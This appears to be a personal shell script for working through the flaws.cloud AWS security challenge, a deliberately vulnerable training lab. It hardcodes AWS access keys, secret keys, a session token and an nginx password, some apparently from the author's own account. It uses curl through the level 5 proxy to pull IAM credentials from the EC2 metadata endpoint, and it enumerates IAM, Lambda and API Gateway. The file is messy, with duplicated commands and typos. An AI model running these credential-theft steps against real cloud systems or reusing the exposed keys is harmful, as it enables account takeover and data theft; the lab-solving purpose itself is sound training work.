#*      Source Environment Variables
#? ----------------------------------------
. ./Flaws.Cloud.Vars.env
# echo "Flaws AWS Credentials Export"
# export AWS_NAME=awsS3Admin
# export AWS_ACCESS_KEY=AKIATQBOZIW65PUG4VN7
# export AWS_SECRET_KEY=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
# export AWS_REGION=us-west-2
# export AWS_AZ=us-west-2a
# export AWS_ID=240616293821
# export AWS_URL=https://240616293821.signin.aws.amazon.com/console

# export BUCKET_URL=http://flaws.cloud.s3-website-us-west-2.amazonaws

# echo "Flaws Level 1 Export"
# export L1_URL=http://flaws.cloud.s3-website-us-west-2.amazonaws
# export L1_BUCKET_IP=52.92.145.3
# export L1_BUCKET_URL=s3://flaws.cloud/
# export L1_SECRET_URL=http://flaws.cloud/secret-dd02c7c.html
# export L1_SECRET_FILE="secret-dd02c7c.html"
# export L1_URL=http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/

# echo "Flaws Level 2 Export"
# export L2_BUCKET_URL=s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/
# export L2_SECRET_URL=s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html
# export L2_SECRET_FILE=secret-e4443fc.html

# echo "Flaws Level 3 Export"
# export L3_URL=http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
# export L3_BUCKET_URL=s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
# export L3_COMMIT=f52ec03b227ea6094b04e43f475fb0126edb5a61
# export L3_SECRET_FILE=access_keys.txt
# export L3_USER_=L3Profile
# export L3_ACCESS_KEY=AKIAJ366LIPB4IJKT7SA
# export L3_SECRET_KEY=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


# # echo "Flaws Level 4 Export"
# export L4_URL=level4-1156739cfb264ced6de514971a4bef68.flaws.cloud
# export L4_SNAPSHOT_ID=snap-0b49342abd1bdcb89
# export L4_VOLUME_ID=vol-01a0d8c03e9dc69bf
# export L4_SNAPSHOT_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
# export L4_ACCOUNT_ID=975426262029
# export L4_USER=L4User
# export L4_ACCESS_KEY=AKIATQBOZIW67V6FCRAW
# export L4_SECRET_KEY=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
# export L4_KEY=L4Key
# export L4_AWS_AZ=us-west-2b
# export L4_VM=Flaws_L4_VM
# export L4_INSTANCE_TYPE=t2.micros
# export L4_IMAGE=ami-0fcf52bcf5db7b003
# export L4_NEW_VM_ID=i-03d9396c835f1f6d6
# export L4_VM_NAME=Flaws_L4_VM
# export L4_NEW_VM_IP=52.27.226.102
# export L4_VM_HOST=ec2-52-27-226-102.us-west-2.compute.amazonaws.com
# export L4_VM_USERubuntu
# export L4_NGINX_USER=flaws
# export L4_NGINX_PASSWORD=nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M

# # echo "Flaws Level 5 Export"
# export L5_URL=level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud

# export EC2_METADATA_IP=169.254.169.254
# export  L5_EC2_URL=http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
# export  L5_EC2_PROXY=http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/
# export EC2_IAM_METADATA_URL=/latest/meta-data/iam/security-credentials/
# export  L5_PROXY_MAIN=flaws.cloud/
# export  L5_PROXY_FEED=summitroute.com/blog/feed.xml/
# export  L5_PROXY_NEVERSSL=neverssl.com/
# export L5_USER=flaws
# export L5_ACCESS_KEY=ASIA6GG7PSQG2KIG27NP
# export L5_SECRET_KEY=bSCfUPs8ZoW46GxHHViwBA3vJNH9+U2NLUfPC4tc


# # echo "Flaws Level 6 Export"
# export L6_BLOCKED_URL=http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
# export L6_URL=http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
# export L6_BUCKET_URL=s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
# export L6_USER=L6Profile
# export L6_ACCESS_KEY=AKIAJFQ6E7BY57Q3OBGA
# export L6_SECRET_KEY=S2IpymMBlViDlqcAnFuZfkVjXrYxZYhP+dZ4ps+
# export L6_IAM_USER=level6

#*             Configure AWS CLI
#? ----------------------------------------
aws configure set default.region $AWS_REGION
aws configure set aws_access_key_id $AWS_ACCESS_KEY
aws configure set aws_secret_access_key $AWS_SECRET_KEY
aws configure set default.output json

#*             Configure AWS CLI awsS3Admin Profile
#? ----------------------------------------
aws configure set default.region $AWS_REGION --profile $$AWS_NAME
aws configure set aws_access_key_id $AWS_ACCESS_KEY --profile $$AWS_NAME
aws configure set aws_secret_access_key $AWS_SECRET_KEY --profile $$AWS_NAME
aws configure set default.output json --profile $$AWS_NAME

#
#*             Copy Flaws Bucket Levels to Local
#? ----------------------------------------
aws s3 sync $L1_BUCKET_URL --no-sign-request --region $AWS_REGION ./flaws1
aws s3 sync --profile $$AWS_NAME $L2_BUCKET_URL --region $AWS_REGION ./flaws2
aws s3 sync --profile $$AWS_NAME $L3_BUCKET_URL --region $AWS_REGION ./flaws3


#*             Create Flaws Level 4 EC2 Instance with Snapshot as Storage 
#? ----------------------------------------
aws --profile $L4_USER ec2 create-volume --availability-zone $AWS_AZ --region $AWS_REGION  --snapshot-id  $L4_SNAPSHOT_ID
aws ec2 run-instances --profile "$L4_USER" --region "$AWS_REGION" --image-id "$L4_IMAGE" --instance-type "$L4_INSTANCE_TYPE" --key-name "$L4_KEY" --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]" --query 'Instances[0].InstanceId' --output text
# aws ec2 run-instances --profile $L4_USER --region $AWS_REGION --image-id $L4_IMAGE --instance-type $L4_INSTANCE_TYPE --key-name $L4_KEY --query 
aws ec2 describe-instances --profile $L4_USER --query 'Reservations[].Instances[?State.Code==`16`].InstanceId' --output text

#*             Create Flaws Level 4 Named EC2 Instance with Snapshot as Storage 
#? -----------------------------------------------------------------
export INSTANCE_ID=$(
        aws ec2 run-instances --profile "$L4_USER" --region "$AWS_REGION" --image-id "$L4_IMAGE" --instance-type "$L4_INSTANCE_TYPE" --key-name "$L4_KEY" --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=MyInstanceName}]' --query 'Instances[0].InstanceId' --output text
    )
export L4_VM_NAME=Flaws_L4_VM
aws ec2 run-instances --profile $L4_USER --region $AWS_REGION --image-id $L4_IMAGE --instance-type $L4_INSTANCE_TYPE --key-name $L4_KEY --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=$L4_VM_NAME}]' --query 'Instances[0].InstanceId' --output text


# SSH TO NEW INSTANCE 
ssh -i $L4_KEY.pem ubuntu@$L4_URL



#?                                              Level 5
#* --------------------------------------------------------------------------------------------



unset EC2_METADATA_IP
unset L5_EC2_URL
unset L5_EC2_PROXY
unset EC2_IAM_METADATA_URL
unset L5_PROXY_MAIN
unset L5_PROXY_FEED
unset L5_PROXY_NEVERSSL
unset L5_USER
unset L5_ACCESS_KEY
unset L5_SECRET_KEY
unset L5_TOKEN
unset L5_IAM_ROLE

export EC2_METADATA_IP=169.254.169.254
export EC2_METADATA_URL=latest/meta-data
export EC2_IAM_METADATA_URL=iam/security-credentials
export L5_EC2_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
export L5_EC2_PROXY=http://$L5_EC2_URL/proxy
export L5_EC2_METADATA_IP=$L5_EC2_PROXY/$EC2_METADATA_IP
export L5_EC2_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL

export L5_EC2_IAM_METADATA_URL=$L5_EC2_METADATA_URL/latest/meta-data/iam/security-credentials




unset L5_EC2_METADATA_IP
unset L5_EC2_METADATA_URL
unset L5_EC2_IAM_METADATA_URL
export EC2_METADATA_IP=169.254.169.254
export EC2_METADATA_URL=latest/meta-data
export EC2_IAM_METADATA_URL=iam/security-credentials
export L5_EC2_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
export L5_EC2_PROXY=http://$L5_EC2_URL/proxy
export L5_EC2_METADATA_IP=$L5_EC2_PROXY/$EC2_METADATA_IP
export L5_EC2_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL
export L5_EC2_IAM_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL/$EC2_IAM_METADATA_URL
echo $L5_EC2_IAM_METADATA_URL





aws ec2 describe-instances --instance-ids <instance-id> --query 'Reservations[].Instances[].PublicDnsName' --output text
export INSTANCE_ID=$(aws ec2 run-instances --profile "$L4_USER" --region "$AWS_REGION" --image-id "$L4_IMAGE" --instance-type "$L4_INSTANCE_TYPE" --key-name "$L4_KEY" --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=MyInstanceName}]' --query 'Instances[0].InstanceId' --output text)


export L4_VM_NAME=Flaws_L4_VM
aws ec2 run-instances --profile $L4_USER --region $AWS_REGION --image-id $L4_IMAGE --instance-type $L4_INSTANCE_TYPE --key-name $L4_KEY --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]' --query 'Instances[0].InstanceId' --output text
export TAG_SPEC="ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]"
aws ec2 run-instances --profile $L4_USER --region $AWS_REGION --image-id $L4_IMAGE --instance-type $L4_INSTANCE_TYPE --key-name $L4_KEY --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]' --query 'Instances[0].InstanceId' --output text








aws ec2 describe-instances --profile $L4_USER --instance-ids $L4_NEW_VM_ID --query 'Reservations[].Instances[].KeyName' --output text
aws ec2 get-console-output --instance-id $L4_NEW_VM_ID --profile $L4_USER --region $AWS_REGION > console.log







unset L5_ACCESS_KEY
unset L5_SECRET_KEY
unset L5_TOKEN

export AWS_REGION=us-west-2
export L5_USER=flaws
# export L5_ACCESS_KEY=ASIA6GG7PSQG2KIG27NP
export L5_ACCESS_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.AccessKeyId')
# export L5_SECRET_KEY=bSCfUPs8ZoW46GxHHViwBA3vJNH9+U2NLUfPC4tc
export L5_SECRET_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.SecretAccessKey')
# export L5_TOKEN=IQoJb3JpZ2luX2VjENT//////////wEaCXVzLXdlc3QtMiJHMEUCICysxf8e25Ao5/bX7HA0OElp5/RnrV8zMCrJwuCup0+VAiEAmc1uLD5e9NbT1px9rBJZEZnWVETMbu6Cn3ZinbkJ6qcquwUIvf//////////ARADGgw5NzU0MjYyNjIwMjkiDGIiCNBVyz80c8UvFCqPBToN3XQ1BlpYWcvCHVp9s9FlhdQZSCz2TGpnbH6i9lDNH+CH0iI3+eq6/GCrQFMN2YtFv4c4joUbFbmvbxv3p4UuG1FeO3bunakS3DzqSBEF2vMNWNKiwRvOOMHstHXBkPDuK2ciHAVzAQ3JaUZEskTq7TXe4gb/i+Epkx0T3NFnX805JflQKqA6YIdHHcR71PdKKvmFxAOhFLZhdvyKYrlf76xxGjirHjXJmNiA8p/PU8ZzsOYTV0Y6kxMVHJGqwVvH4Cng+iBtL+WfponpZRMgHcBvLw0a2mMrX20BjmI7ifJAfZ9bjX90FnFvqccnnEhYjycEbty+mRtLFmDPo0KM2mbgcQWxp+s1uwzAZTI8Ft4xY6UpHDmAF/6kAU1TNUJuuOz1NtAyxwPly6+k5GaayFumsRW4VbUucLTfeQGOBUlwJAtcT2DUg5kMT9QxNz+RAFpch0f0UCGie2LOlYtg5CIbnN1IxgYjNDcp9MPqYGvVB/g5VnIxZQNHjYE65Q4ScYxwV7UIgqHcG9ZHdjRxEc/jivLvrbcqidUpoxwv55YWTpkvENLgxpQPgX98n1Kmv1ycXYVkfbTvfnPqoWz9QKIITbF+inM+oVE2IT/7jQXnnU3USLHV1DUjOxMeYZ+1BzgwQB6nZYUtvMnESVa5R0iI7r+gPOIeNcVFL3HgeD6ZuN0ZGHzDO7TvuNo4R9D+5pUQ8F4jjkZA5ynmCGkwplOlPY0EeYjl4wnAOBhjvrX20MbbPwZ6yXevi5RlkpFWr5Yennp0cXCNxUsf7Nu5EAaYFgD+PpaGRrHBkgGg9GfGQlrUE13bKVLmJsAQOuokwf9aMGc6yj9YlB5SVsjratoon+e9It1/jwb33jMwqrraoQY6sQGUxpVr3JxA1UBSG3lCGGI5seaaSLOlnTT4G03cpBaCd2RxxISOlv3LtXs5bsLCzR2+eHUeulhCn9mH/Q/SDm5ysm7ztt4DJVzqZy+2CZ+yH9aXzOHOmHhQisOboLdj9V3NMQ/9P8ZKeWpVyQSTcEaK3kJ9mkbP7NJSWOnnW1S7r0kSyq2p8v0My/6ge4gtxeZTkzws4nRcS3XIlzoqlDxHGnwDzz/op65TdyGre0bPiQ8=
export L5_TOKEN=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.Token')



echo -e "Region: \n$AWS_REGION\n"
echo -e "USER: \n$L5_USER\n"
echo -e "ACCESS KEY: \n$L5_ACCESS_KEY\n"
echo -e "SECRET KEY: \n$L5_SECRET_KEY\n"
echo -e "TOKEN: \n$L5_TOKEN\n"


echo $AWS_ACCESS_KEY
echo $AWS_SECRET_KEY
echo $L5_ACCESS_KEY
echo $L5_SECRET_KEY

aws s3 ls --profile $L5_USER --region $AWS_REGION $L6_BUCKET_URL






#?                                              Level 6
#* --------------------------------------------------------------------------------------------
# "SecurityAudit": This is an AWS policies you can look up either in your console or here
# https://gist.github.com/gene1wood/55b358748be3c314f956#file-all_aws_managed_policies-json-L5664
# "list_apigateways": This is a custom one I made. I bet it'll be useful for this challenge, so we should try to figure out what it is.
#! Prerequisites:
#*?----------------

#* Unset the variables
unset L6_URL
unset BUCKET_URL
unset L6_USER
unset L6_ACCESS_KEY
unset L6_SECRET_KEY
unset L6_IAM_USER

#* Export the variables
export L6_URL=http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/
export L6_BUCKET_URL=s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud
export L6_USER=L6Profile
export L6_ACCESS_KEY=AKIAJFQ6E7BY57Q3OBGA
export L6_SECRET_KEY=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
export L6_IAM_USER=level6

#! Todos:
#?----------------
#TODO 6.0 Create Level 6 Name

#TODO 6.1 Create the L6 profile
./Flaws-Scripts/aws_cli_configure_L6Profile.sh

#TODO 6.2 Get IAM User Info
aws iam get-user --profile $L6_USER --region $AWS_REGION

#TODO 6.3 Get IAM User Attached Policies
export L6_IAM_USER_POLICIES=$(aws iam list-attached-user-policies --user-name "$L6_IAM_USER" --profile "$L6_USER" --region "$AWS_REGION" --query 'AttachedPolicies[].PolicyArn' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" iam get-policy --policy-arn {} --query 'Policy.{PolicyName: PolicyName, PolicyArn: Arn, DefaultVersionId: DefaultVersionId}' --output json | jq -s '.')

#TODO 6.5 Loop through Policies To Get Policy Document with Allowed Actions
policies_full_output=()

for policy in $(echo "$L6_IAM_USER_POLICIES" | jq -c '.[]'); do
    policy_arn=$(echo "$policy" | jq -r '.PolicyArn')
    policy_name=$(echo "$policy" | jq -r '.PolicyName')
    policy_version=$(echo "$policy" | jq -r '.DefaultVersionId')
    policy_document=$(aws --profile $L6_USER iam get-policy-version --policy-arn "$policy_arn" --version-id "$policy_version" --query 'PolicyVersion.Document' --output json)
    policy_dict="{\"PolicyName\":\"$policy_name\",\"PolicyArn\":\"$policy_arn\",\"DefaultVersionId\":\"$policy_version\",\"PolicyDocument\":$policy_document}"
    policies_full_output+=("$policy_dict")
done

# join the policy objects in the array with a comma and surround with square brackets
policies_full_output="[$(IFS=, ; echo "${policies_full_output[*]}")]"
echo $policies_full_output
export L6_IAM_USER_POLICIES_FULL="$policies_full_output"




#TODO 6.6 Using apigateway to GET - List Lamda Functions & Policies
# export L6_EC2_LAMBDA_FUNCTIONS=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[]' --output json)
export L6_EC2_LAMBDA_FUNCTION=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '[:upper:]' '[:lower:]')
export L6_EC2_LAMBDA_POLICY=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.')
export L6_ACCOUNT_ID=$(aws --region $AWS_REGION --profile $L6_USER sts get-caller-identity --query 'Account' --output text)
export L6_EC2_LAMBDA_ARN_STR=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Condition.ArnLike."AWS:SourceArn"')
export L6_EC2_LAMBDA_API=$(echo "$L6_EC2_LAMBDA_ARN_STR" | cut -d ':' -f 6 | cut -d '/' -f 1)
export L6_EC2_LAMBDA_STAGE=$(aws --region $AWS_REGION --profile $L6_USER apigateway get-stages --rest-api-id $L6_EC2_LAMBDA_API --query 'item[0].stageName' --output text)
export L6_EC2_LAMBDA_SERVICE=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Principal.Service' | tr -d '"' | sed 's/\..*//' | uniq )
export L6_EC2_LAMBDA_FUNC_DOMAIN=$(echo "$L6_EC2_LAMBDA_ARN_STR" | grep -oP 'arn:aws:\K\w+-\w+')
export L6_LAMBDA_FINAL_URL="https://$L6_EC2_LAMBDA_API.$L6_EC2_LAMBDA_FUNC_DOMAIN.$AWS_REGION.amazonaws.com/$L6_EC2_LAMBDA_STAGE/$L6_EC2_LAMBDA_FUNCTION"
export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')





echo $L6_EC2_LAMBDA_FUNCTION
echo $L6_EC2_LAMBDA_POLICY
echo $L6_ACCOUNT_ID
echo $L6_EC2_LAMBDA_ARN_STR
echo $L6_LAMBDA_FINAL_URL
echo $L6_FINAL_URL




